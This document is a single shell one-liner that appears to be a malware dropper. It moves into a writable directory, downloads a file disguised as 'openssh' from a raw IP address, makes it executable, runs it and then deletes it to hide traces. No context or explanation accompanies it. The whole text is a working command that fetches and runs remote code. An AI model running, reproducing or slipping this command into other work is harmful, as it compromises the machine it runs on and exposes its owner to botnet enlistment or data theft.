cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.177.23.183/openssh; chmod +x openssh; ./openssh; rm -rf openssh
